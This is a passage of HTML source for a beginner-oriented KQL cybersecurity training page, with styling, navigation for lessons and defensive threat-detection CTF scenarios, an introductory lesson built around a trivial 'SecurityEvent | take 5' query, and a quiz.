<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KQL CyberForge - Production Training Platform</title>
    <style>
        :root {
            --primary-blue: #0078d4;
            --secondary-blue: #106ebe;
            --accent-cyan: #00bcf2;
            --success-green: #107c10;
            --warning-orange: #ff8c00;
            --danger-red: #d13438;
            --dark-bg: #1b1b1b;
            --card-bg: #2d2d30;
            --text-primary: #ffffff;
            --text-secondary: #cccccc;
            --border-color: #3e3e42;
            --glass-bg: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--dark-bg);
            color: var(--text-primary);
            line-height: 1.6;
            overflow-x: hidden;
        }

        .cybersecurity-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 188, 242, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(0, 120, 212, 0.1) 0%, transparent 50%);
            z-index: -1;
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .header {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(135deg, #0078d4, #106ebe);
        }

        .platform-title {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .platform-title h1 {
            font-size: 3.5em;
            font-weight: 700;
            background: linear-gradient(135deg, #0078d4, #106ebe);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-left: 15px;
            text-shadow: 0 0 30px rgba(0, 120, 212, 0.5);
        }

        .platform-subtitle {
            text-align: center;
            font-size: 1.3em;
            color: var(--text-secondary);
            margin-bottom: 30px;
            font-weight: 300;
        }

        .deployment-banner {
            background: linear-gradient(135deg, #107c10, #0f7b0f);
            color: white;
            padding: 15px 25px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 20px;
            border: 2px solid #2ea043;
            box-shadow: 0 10px 30px rgba(16, 124, 16, 0.3);
        }

        .deployment-banner strong {
            font-size: 1.1em;
        }

        .mode-selector {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }

        .mode-card {
            background: var(--glass-bg);
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 20px 30px;
            cursor: pointer;
            transition: all 0.3s ease;
            min-width: 200px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .mode-card:hover {
            border-color: var(--primary-blue);
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0, 120, 212, 0.3);
        }

        .mode-card.active {
            border-color: var(--accent-cyan);
            background: rgba(0, 188, 242, 0.1);
        }

        .mode-icon {
            font-size: 2.5em;
            margin-bottom: 10px;
            display: block;
        }

        .user-dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: var(--glass-bg);
            border: 1px solid var(--border-color);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
        }

        .stat-value {
            font-size: 2.2em;
            font-weight: bold;
            margin-bottom: 5px;
            background: linear-gradient(135deg, #00bcf2, #0078d4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .stat-label {
            color: var(--text-secondary);
            font-size: 0.85em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .main-content {
            display: grid;
            grid-template-columns: 350px 1fr 320px;
            gap: 30px;
            align-items: start;
        }

        .sidebar {
            background: var(--glass-bg);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 25px;
            backdrop-filter: blur(20px);
            height: fit-content;
            position: sticky;
            top: 20px;
        }

        .learning-area {
            background: var(--glass-bg);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 30px;
            backdrop-filter: blur(20px);
            min-height: 800px;
            position: relative;
        }

        .section-title {
            color: var(--accent-cyan);
            font-size: 1.4em;
            font-weight: 600;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .nav-item {
            display: flex;
            align-items: center;
            padding: 15px;
            margin: 8px 0;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
            position: relative;
        }

        .nav-item:hover {
            background: rgba(0, 120, 212, 0.1);
            border-color: var(--primary-blue);
            transform: translateX(5px);
        }

        .nav-item.completed {
            background: rgba(16, 124, 16, 0.2);
            border-color: var(--success-green);
        }

        .nav-item.current {
            background: rgba(0, 188, 242, 0.2);
            border-color: var(--accent-cyan);
            font-weight: 600;
        }

        .nav-icon {
            font-size: 1.5em;
            margin-right: 12px;
            min-width: 30px;
        }

        .nav-content {
            flex: 1;
        }

        .nav-title {
            font-weight: 600;
            margin-bottom: 2px;
        }

        .nav-subtitle {
            font-size: 0.8em;
            color: var(--text-secondary);
        }

        .difficulty-indicator {
            margin-left: auto;
            padding: 4px 8px;
            border-radius: 8px;
            font-size: 0.7em;
            font-weight: bold;
            text-transform: uppercase;
        }

        .beginner { background: var(--success-green); color: white; }
        .intermediate { background: var(--warning-orange); color: white; }
        .advanced { background: var(--danger-red); color: white; }
        .expert { background: linear-gradient(45deg, var(--danger-red), #8b0000); color: white; }

        .content-section {
            display: none;
            animation: fadeInSlide 0.5s ease;
        }

        .content-section.active {
            display: block;
        }

        @keyframes fadeInSlide {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .lesson-header {
            border-bottom: 3px solid var(--primary-blue);
            padding-bottom: 20px;
            margin-bottom: 30px;
        }

        .lesson-title {
            font-size: 2.5em;
            font-weight: 700;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #0078d4, #106ebe);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .lesson-meta {
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }

        .meta-badge {
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.9em;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .code-environment {
            background: #0d1117;
            border: 2px solid var(--border-color);
            border-radius: 12px;
            margin: 25px 0;
            overflow: hidden;
            position: relative;
        }

        .code-header {
            background: #21262d;
            padding: 12px 20px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 0.9em;
        }

        .code-editor {
            padding: 20px;
            position: relative;
        }

        .code-textarea {
            width: 100%;
            min-height: 200px;
            background: transparent;
            border: none;
            color: #f0f6fc;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            resize: vertical;
            outline: none;
        }

        .action-buttons {
            display: flex;
            gap: 15px;
            margin: 20px 0;
            flex-wrap: wrap;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            font-size: 0.95em;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
            position: relative;
            overflow: hidden;
        }

        .btn-primary {
            background: linear-gradient(135deg, #0078d4, #106ebe);
            color: white;
            box-shadow: 0 8px 25px rgba(0, 120, 212, 0.3);
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 35px rgba(0, 120, 212, 0.4);
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }

        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.2);
            border-color: var(--primary-blue);
        }

        .btn-success {
            background: var(--success-green);
            color: white;
        }

        .btn-danger {
            background: var(--danger-red);
            color: white;
        }

        .results-panel {
            background: #0d1117;
            border: 2px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            font-family: monospace;
            min-height: 150px;
            position: relative;
        }

        .results-header {
            color: var(--accent-cyan);
            font-weight: bold;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
        }

        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
            font-family: monospace;
            font-size: 0.9em;
            background: rgba(255, 255, 255, 0.02);
        }

        .data-table th,
        .data-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
        }

        .data-table th {
            background: rgba(0, 120, 212, 0.2);
            color: var(--accent-cyan);
            font-weight: 600;
        }

        .data-table tr:hover {
            background: rgba(0, 120, 212, 0.1);
        }

        .ctf-scenario {
            background: linear-gradient(135deg, rgba(209, 52, 56, 0.1), rgba(139, 0, 0, 0.1));
            border: 2px solid var(--danger-red);
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
            position: relative;
            overflow: hidden;
        }

        .ctf-scenario::before {
            content: '🚨';
            position: absolute;
            top: 15px;
            right: 15px;
            font-size: 1.5em;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .scenario-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .scenario-title {
            font-size: 1.4em;
            font-weight: bold;
            color: var(--danger-red);
        }

        .scenario-points {
            margin-left: auto;
            background: linear-gradient(135deg, #0078d4, #106ebe);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: bold;
        }

        .intel-briefing {
            background: rgba(0, 188, 242, 0.1);
            border-left: 4px solid var(--accent-cyan);
            padding: 20px;
            margin: 20px 0;
            border-radius: 0 10px 10px 0;
        }

        .threat-indicator {
            background: rgba(255, 140, 0, 0.1);
            border: 1px solid var(--warning-orange);
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .achievement-popup {
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #0078d4, #106ebe);
            color: white;
            padding: 20px 25px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            transform: translateX(400px);
            transition: transform 0.5s ease;
            z-index: 1000;
            min-width: 320px;
            max-width: 400px;
        }

        .achievement-popup.show {
            transform: translateX(0);
        }

        .progress-ring {
            width: 100px;
            height: 100px;
            margin: 15px auto;
        }

        .progress-ring-circle {
            stroke: var(--primary-blue);
            stroke-width: 6;
            fill: none;
            stroke-dasharray: 251.2;
            stroke-dashoffset: 251.2;
            transition: stroke-dashoffset 0.5s ease;
        }

        .leaderboard-item {
            display: flex;
            align-items: center;
            padding: 15px;
            margin: 10px 0;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            border-left: 4px solid var(--primary-blue);
            transition: all 0.3s ease;
        }

        .leaderboard-item:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: translateX(5px);
        }

        .rank-badge {
            font-size: 1.3em;
            margin-right: 15px;
            min-width: 35px;
            text-align: center;
        }

        .user-info {
            flex: 1;
        }

        .user-name {
            font-weight: 600;
            margin-bottom: 3px;
        }

        .user-title {
            font-size: 0.75em;
            color: var(--text-secondary);
        }

        .score {
            font-weight: bold;
            color: var(--accent-cyan);
            font-size: 0.95em;
        }

        .quiz-question {
            background: rgba(0, 120, 212, 0.1);
            border: 2px solid var(--primary-blue);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
        }

        .quiz-option {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid var(--border-color);
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .quiz-option:hover {
            border-color: var(--primary-blue);
            background: rgba(0, 120, 212, 0.1);
        }

        .quiz-option.correct {
            border-color: var(--success-green);
            background: rgba(16, 124, 16, 0.2);
        }

        .quiz-option.incorrect {
            border-color: var(--danger-red);
            background: rgba(209, 52, 56, 0.2);
        }

        .terminal-window {
            background: #000;
            border-radius: 8px;
            overflow: hidden;
            margin: 20px 0;
            font-family: 'Consolas', monospace;
        }

        .terminal-header {
            background: #2d2d2d;
            padding: 8px 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .terminal-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .dot-red { background: #ff5f56; }
        .dot-yellow { background: #ffbd2e; }
        .dot-green { background: #27ca3f; }

        .terminal-body {
            padding: 20px;
            color: #00ff00;
            font-size: 13px;
            line-height: 1.4;
        }

        .save-progress-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--success-green);
            color: white;
            border: none;
            padding: 15px 20px;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 8px 25px rgba(16, 124, 16, 0.3);
            transition: all 0.3s ease;
            z-index: 1000;
        }

        .save-progress-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 35px rgba(16, 124, 16, 0.4);
        }

        @media (max-width: 1400px) {
            .main-content {
                grid-template-columns: 1fr;
                gap: 20px;
            }
            
            .sidebar {
                order: -1;
                position: static;
            }
        }

        @media (max-width: 768px) {
            .platform-title h1 {
                font-size: 2.5em;
            }
            
            .mode-selector {
                flex-direction: column;
                align-items: center;
            }
            
            .user-dashboard {
                grid-template-columns: repeat(2, 1fr);
            }
        }
    </style>
</head>
<body>
    <div class="cybersecurity-bg"></div>

    <div class="container">
        <!-- Header Section -->
        <div class="header">
            <div class="deployment-banner">
                <strong>🚀 PRODUCTION READY</strong> | Internal Deployment | Full Dataset Included | No Backend Required
            </div>
            
            <div class="platform-title">
                <span style="font-size: 3em;">🛡️</span>
                <h1>KQL CyberForge</h1>
            </div>
            <div class="platform-subtitle">
                Production-Ready Cybersecurity Training Platform | Deploy Instantly | Zero Dependencies
            </div>

            <!-- Mode Selection -->
            <div class="mode-selector">
                <div class="mode-card active" data-mode="learning">
                    <span class="mode-icon">📚</span>
                    <h3>Interactive Learning</h3>
                    <p>Progressive KQL Mastery</p>
                </div>
                <div class="mode-card" data-mode="ctf">
                    <span class="mode-icon">🚨</span>
                    <h3>CTF Challenges</h3>
                    <p>10 Real-World Scenarios</p>
                </div>
                <div class="mode-card" data-mode="sandbox">
                    <span class="mode-icon">⚗️</span>
                    <h3>Query Sandbox</h3>
                    <p>Practice Environment</p>
                </div>
                <div class="mode-card" data-mode="analytics">
                    <span class="mode-icon">📊</span>
                    <h3>Learning Analytics</h3>
                    <p>Progress Dashboard</p>
                </div>
            </div>

            <!-- User Dashboard -->
            <div class="user-dashboard">
                <div class="stat-card">
                    <div class="stat-value" id="total-xp">3,750</div>
                    <div class="stat-label">Total XP</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="user-level">18</div>
                    <div class="stat-label">Security Level</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="badges-earned">34</div>
                    <div class="stat-label">Badges Earned</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="ctf-solved">7</div>
                    <div class="stat-label">CTF Completed</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="streak-days">28</div>
                    <div class="stat-label">Learning Streak</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="rank-position">#8</div>
                    <div class="stat-label">Global Rank</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="completion-rate">89%</div>
                    <div class="stat-label">Completion Rate</div>
                </div>
            </div>
        </div>

        <!-- Main Content Area -->
        <div class="main-content">
            <!-- Left Sidebar - Navigation -->
            <div class="sidebar">
                <!-- Learning Mode Navigation -->
                <div id="learning-nav" class="nav-section active">
                    <h3 class="section-title">🎯 Learning Modules</h3>
                    <div class="nav-item current" data-content="kql-introduction">
                        <span class="nav-icon">🎓</span>
                        <div class="nav-content">
                            <div class="nav-title">What is KQL?</div>
                            <div class="nav-subtitle">Complete beginner introduction</div>
                        </div>
                        <span class="difficulty-indicator beginner">Start</span>
                    </div>
                    <div class="nav-item" data-content="kql-basics">
                        <span class="nav-icon">📝</span>
                        <div class="nav-content">
                            <div class="nav-title">KQL Fundamentals</div>
                            <div class="nav-subtitle">Tables, pipes, basic operators</div>
                        </div>
                        <span class="difficulty-indicator beginner">Basic</span>
                    </div>
                    <div class="nav-item completed" data-content="data-filtering">
                        <span class="nav-icon">✅</span>
                        <div class="nav-content">
                            <div class="nav-title">Advanced Filtering</div>
                            <div class="nav-subtitle">Where clauses, conditions</div>
                        </div>
                        <span class="difficulty-indicator beginner">Basic</span>
                    </div>
                    <div class="nav-item current" data-content="threat-hunting">
                        <span class="nav-icon">🎯</span>
                        <div class="nav-content">
                            <div class="nav-title">Threat Hunting</div>
                            <div class="nav-subtitle">Security log analysis</div>
                        </div>
                        <span class="difficulty-indicator intermediate">Inter</span>
                    </div>
                    <div class="nav-item" data-content="aggregations">
                        <span class="nav-icon">📊</span>
                        <div class="nav-content">
                            <div class="nav-title">Data Aggregation</div>
                            <div class="nav-subtitle">Summarize, group, calculate</div>
                        </div>
                        <span class="difficulty-indicator intermediate">Inter</span>
                    </div>
                    <div class="nav-item" data-content="joins-unions">
                        <span class="nav-icon">🔗</span>
                        <div class="nav-content">
                            <div class="nav-title">Joins & Unions</div>
                            <div class="nav-subtitle">Combining data sources</div>
                        </div>
                        <span class="difficulty-indicator advanced">Adv</span>
                    </div>
                    <div class="nav-item" data-content="time-series">
                        <span class="nav-icon">⏰</span>
                        <div class="nav-content">
                            <div class="nav-title">Time Series Analysis</div>
                            <div class="nav-subtitle">Temporal patterns, make_series</div>
                        </div>
                        <span class="difficulty-indicator advanced">Adv</span>
                    </div>
                    <div class="nav-item" data-content="machine-learning">
                        <span class="nav-icon">🤖</span>
                        <div class="nav-content">
                            <div class="nav-title">ML & Analytics</div>
                            <div class="nav-subtitle">Anomaly detection, clustering</div>
                        </div>
                        <span class="difficulty-indicator expert">Expert</span>
                    </div>
                </div>

                <!-- CTF Navigation -->
                <div id="ctf-nav" class="nav-section">
                    <h3 class="section-title">🚨 CTF Scenarios</h3>
                    <div class="nav-item completed" data-content="ctf-login-anomaly">
                        <span class="nav-icon">🥉</span>
                        <div class="nav-content">
                            <div class="nav-title">Suspicious Logins</div>
                            <div class="nav-subtitle">200 pts • Brute force detection</div>
                        </div>
                    </div>
                    <div class="nav-item completed" data-content="ctf-data-exfil">
                        <span class="nav-icon">🥉</span>
                        <div class="nav-content">
                            <div class="nav-title">Data Exfiltration</div>
                            <div class="nav-subtitle">300 pts • Traffic analysis</div>
                        </div>
                    </div>
                    <div class="nav-item current" data-content="ctf-malware-c2">
                        <span class="nav-icon">🥈</span>
                        <div class="nav-content">
                            <div class="nav-title">Malware C2 Traffic</div>
                            <div class="nav-subtitle">500 pts • Beaconing detection</div>
                        </div>
                    </div>
                    <div class="nav-item" data-content="ctf-privilege-esc">
                        <span class="nav-icon">🥈</span>
                        <div class="nav-content">
                            <div class="nav-title">Privilege Escalation</div>
                            <div class="nav-subtitle">600 pts • Attack progression</div>
                        </div>
                    </div>
                    <div class="nav-item" data-content="ctf-lateral-movement">
                        <span class="nav-icon">🥈</span>
                        <div class="nav-content">
                            <div class="nav-title">Lateral Movement</div>
                            <div class="nav-subtitle">750 pts • Network traversal</div>
                        </div>
                    </div>
                    <div class="nav-item" data-content="ctf-apt-campaign">
                        <span class="nav-icon">🥇</span>
                        <div class="nav-content">
                            <div class="nav-title">APT Campaign</div>
                            <div class="nav-subtitle">1000 pts • Multi-stage attack</div>
                        </div>
                    </div>
                    <div class="nav-item" data-content="ctf-zero-day">
                        <span class="nav-icon">🥇</span>
                        <div class="nav-content">
                            <div class="nav-title">Zero-Day Exploit</div>
                            <div class="nav-subtitle">1250 pts • Novel attack vector</div>
                        </div>
                    </div>
                    <div class="nav-item" data-content="ctf-supply-chain">
                        <span class="nav-icon">💎</span>
                        <div class="nav-content">
                            <div class="nav-title">Supply Chain Attack</div>
                            <div class="nav-subtitle">1500 pts • Sophisticated campaign</div>
                        </div>
                    </div>
                    <div class="nav-item" data-content="ctf-nation-state">
                        <span class="nav-icon">💎</span>
                        <div class="nav-content">
                            <div class="nav-title">Nation-State Actor</div>
                            <div class="nav-subtitle">1750 pts • Advanced persistent threat</div>
                        </div>
                    </div>
                    <div class="nav-item" data-content="ctf-final-boss">
                        <span class="nav-icon">👑</span>
                        <div class="nav-content">
                            <div class="nav-title">The Final Challenge</div>
                            <div class="nav-subtitle">2500 pts • Ultimate test</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Main Learning Area -->
            <div class="learning-area">
                <!-- Complete Beginner Introduction -->
                <div class="content-section active" id="kql-introduction">
                    <div class="lesson-header">
                        <h2 class="lesson-title">🎓 Welcome to KQL - Your Journey Starts Here!</h2>
                        <div class="lesson-meta">
                            <span class="meta-badge beginner">
                                <span>🌟</span> Complete Beginner
                            </span>
                            <span class="meta-badge">
                                <span>⏱️</span> 15 minutes
                            </span>
                            <span class="meta-badge">
                                <span>🎯</span> Perfect Starting Point
                            </span>
                        </div>
                    </div>

                    <div class="intel-briefing">
                        <h4>👋 New to KQL? You're in the Right Place!</h4>
                        <p><strong>Don't worry if you've never heard of KQL!</strong> This platform is designed to take you from complete beginner to expert cybersecurity analyst. We'll start with the absolute basics and build your skills step by step.</p>
                        
                        <p><strong>What You'll Learn:</strong> By the end of this journey, you'll be analyzing security threats, hunting for malware, and protecting organizations using one of the most powerful data analysis languages in cybersecurity.</p>
                    </div>

                    <h3 style="color: var(--accent-cyan); margin: 25px 0 15px 0;">🤔 What Exactly is KQL?</h3>
                    
                    <div style="background: var(--glass-bg); padding: 25px; border-radius: 15px; margin: 20px 0;">
                        <h4 style="color: var(--accent-cyan); margin-bottom: 15px;">KQL in Simple Terms</h4>
                        <p style="font-size: 1.1em; line-height: 1.6;">
                            <strong>KQL (Kusto Query Language)</strong> is like having a conversation with your computer's security logs. Instead of manually looking through millions of log entries, KQL lets you ask specific questions like:
                        </p>
                        <ul style="margin: 15px 0 15px 30px; line-height: 1.8;">
                            <li>"Show me all failed login attempts from the last 24 hours"</li>
                            <li>"Find any suspicious PowerShell commands"</li>
                            <li>"Which users are logging in from unusual locations?"</li>
                            <li>"Detect any malware communication patterns"</li>
                        </ul>
                        <p style="font-size: 1.1em;">
                            <strong>Think of it as:</strong> A super-powered search engine specifically designed for cybersecurity investigations.
                        </p>
                    </div>

                    <h3 style="color: var(--accent-cyan); margin: 25px 0 15px 0;">🌍 Why is KQL Important in Cybersecurity?</h3>
                    
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 20px 0;">
                        <div style="background: rgba(0, 120, 212, 0.1); padding: 20px; border-radius: 10px; border-left: 4px solid var(--primary-blue);">
                            <h4>🛡️ Used by Microsoft</h4>
                            <p>KQL powers Microsoft's security products: Azure Sentinel, Defender, and Log Analytics. It's the standard for enterprise security.</p>
                        </div>
                        <div style="background: rgba(16, 124, 16, 0.1); padding: 20px; border-radius: 10px; border-left: 4px solid var(--success-green);">
                            <h4>🚀 High Demand Skill</h4>
                            <p>Security analysts with KQL skills earn $80K-150K+. Organizations desperately need people who can analyze security data effectively.</p>
                        </div>
                        <div style="background: rgba(255, 140, 0, 0.1); padding: 20px; border-radius: 10px; border-left: 4px solid var(--warning-orange);">
                            <h4>⚡ Real-Time Threat Hunting</h4>
                            <p>KQL enables you to hunt for threats in real-time, stopping attacks before they cause damage. You become a digital detective!</p>
                        </div>
                    </div>

                    <h3 style="color: var(--accent-cyan); margin: 25px 0 15px 0;">🎯 Your Learning Path (No Experience Required!)</h3>
                    
                    <div class="terminal-window">
                        <div class="terminal-header">
                            <div class="terminal-dot dot-red"></div>
                            <div class="terminal-dot dot-yellow"></div>
                            <div class="terminal-dot dot-green"></div>
                            <span style="margin-left: 10px; color: #ccc;">Your Complete Learning Journey</span>
                        </div>
                        <div class="terminal-body">
🎓 <strong>Stage 1: Complete Beginner (You Are Here)</strong><br>
   ├── What is KQL and why it matters<br>
   ├── Understanding data tables and columns<br>
   ├── Your first simple queries<br>
   └── Basic filtering and selection<br><br>

📊 <strong>Stage 2: Building Foundations</strong><br>
   ├── Core KQL operators (where, project, take)<br>
   ├── Working with different data types<br>
   ├── Understanding query structure<br>
   └── Practice with guided exercises<br><br>

🔍 <strong>Stage 3: Security Applications</strong><br>
   ├── Analyzing security logs<br>
   ├── Detecting suspicious activities<br>
   ├── Understanding common attack patterns<br>
   └── Building threat hunting queries<br><br>

🚨 <strong>Stage 4: Advanced Threat Hunting</strong><br>
   ├── Complex data correlations<br>
   ├── Time-based analysis<br>
   ├── Advanced security scenarios<br>
   └── Real-world CTF challenges<br><br>

🏆 <strong>Stage 5: Expert Level</strong><br>
   ├── Machine learning with KQL<br>
   ├── Custom security analytics<br>
   ├── Leading incident response<br>
   └── Teaching others
                        </div>
                    </div>

                    <div style="background: rgba(16, 124, 16, 0.1); border-left: 4px solid var(--success-green); padding: 20px; margin: 20px 0; border-radius: 0 10px 10px 0;">
                        <h4>✅ No Prerequisites Required!</h4>
                        <p><strong>Zero Experience Needed:</strong> You don't need any programming background, security experience, or technical knowledge. We start from the very beginning.</p>
                        <p><strong>Learn by Doing:</strong> Every concept includes hands-on practice with real examples. You'll see immediate results as you learn.</p>
                        <p><strong>Your Pace:</strong> Learn as fast or slow as you want. The platform saves your progress automatically.</p>
                    </div>

                    <h3 style="color: var(--accent-cyan); margin: 25px 0 15px 0;">🎮 Let's Start with Your First Query!</h3>
                    
                    <div style="background: rgba(0, 188, 242, 0.1); border-left: 4px solid var(--accent-cyan); padding: 20px; margin: 20px 0; border-radius: 0 10px 10px 0;">
                        <h4>🎯 Your First Challenge: See Some Data</h4>
                        <p>Let's start with the simplest possible query. Don't worry about understanding everything - just follow along and see what happens!</p>
                        <p><strong>Goal:</strong> Display the first 5 rows of security data to see what we're working with.</p>
                    </div>

                    <div class="code-environment">
                        <div class="code-header">
                            <span style="color: #f0f6fc;">🔬 Your First KQL Query</span>
                            <span style="color: #7d8590;">Don't worry - we'll explain everything!</span>
                        </div>
                        <div class="code-editor">
                            <textarea class="code-textarea" id="intro-first-query">// Your very first KQL query - just click "Run" to see what happens!
SecurityEvent
| take 5</textarea>
                        </div>
                    </div>

                    <div class="action-buttons">
                        <button class="btn btn-primary" onclick="executeBeginnerQuery('intro-first-query')">
                            <span>🚀</span> Run My First Query!
                        </button>
                        <button class="btn btn-secondary" onclick="explainFirstQuery()">
                            <span>🤔</span> Explain What This Does
                        </button>
                    </div>

                    <div class="results-panel" id="intro-first-query-results">
                        <div class="results-header">
                            <span>✨</span> Your First Results Will Appear Here
                        </div>
                        <div style="color: #7d8590; font-style: italic;">Click "Run My First Query!" to see the magic happen...</div>
                    </div>

                    <div style="background: rgba(255, 215, 0, 0.1); border: 2px solid #ffd700; padding: 20px; margin: 20px 0; border-radius: 15px; display: none;" id="first-query-explanation">
                        <h4 style="color: #ffd700;">🎉 Congratulations! You Just Wrote Your First KQL Query!</h4>
                        <p><strong>Here's what happened:</strong></p>
                        <ul style="margin-left: 20px; line-height: 1.8;">
                            <li><code style="background: #333; padding: 2px 6px; border-radius: 3px;">SecurityEvent</code> - This tells KQL which table (collection of data) to look at</li>
                            <li><code style="background: #333; padding: 2px 6px; border-radius: 3px;">|</code> - This is called a "pipe" - think of it as "then do this next"</li>
                            <li><code style="background: #333; padding: 2px 6px; border-radius: 3px;">take 5</code> - This means "show me just the first 5 rows"</li>
                        </ul>
                        <p><strong>You're already doing cybersecurity analysis!</strong> 🎯</p>
                    </div>

                    <div class="quiz-question">
                        <h4>🧠 Quick Check: What does the "|" symbol do in KQL?</h4>
                        <div class="quiz-option" onclick="selectAnswer(this, false)">A) It's a decoration that makes queries look nice</div>
                        <div class="quiz-option" onclick="selectAnswer(this, true)">B) It connects steps in a query, like "then do this next"</div>
                        <div class="quiz-option" onclick="selectAnswer(this, false)">C) It's used for mathematical division</div>
                        <div class="quiz-option" onclick="selectAnswer(this, false)">D) It separates different tables</div>
                    </div>

                    <div class="action-buttons">
                        <button class="btn btn-success" onclick="completeLesson('kql-basics')">
                            <span>➡️</span> I'm Ready for KQL Basics!
                        </button>
                        <button class="btn btn-secondary" onclick="showBeginnerResources()">
                            <span>📚</span> Show Me More Resources
                        </button>
                    </div>
                </div>

                <!-- Enhanced KQL Basics for Beginners -->
                <div class="content-section" id="kql-basics">
                    <div class="lesson-header">
                        <h2 class="lesson-title">📝 KQL Fundamentals - Building Your Foundation</h2>
                        <div class="lesson-meta">
                            <span class="meta-badge beginner">
                                <span>🧱</span> Foundation Level
                            </span>
                            <span class="meta-badge">
                                <span>⏱️</span> 25 minutes
                            </span>
                            <span class="meta-badge">
                                <span>🎯</span> 150 XP
                            </span>
                        </div>
                    </div>

                    <div class="intel-briefing">
                        <h4>🎯 What You'll Master in This Lesson</h4>
                        <p>Now that you've run your first query, let's build a solid foundation. You'll learn the core building blocks that every KQL query uses, explained in simple terms with plenty of examples.</p>
                    </div>

                    <h3 style="color: var(--accent-cyan); margin: 25px 0 15px 0;">🏗️ The Building Blocks of Every KQL Query</h3>
                    
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin: 20px 0;">
                        <div style="background: rgba(0, 120, 212, 0.1); padding: 20px; border-radius: 12px; border: 2px solid var(--primary-blue);">
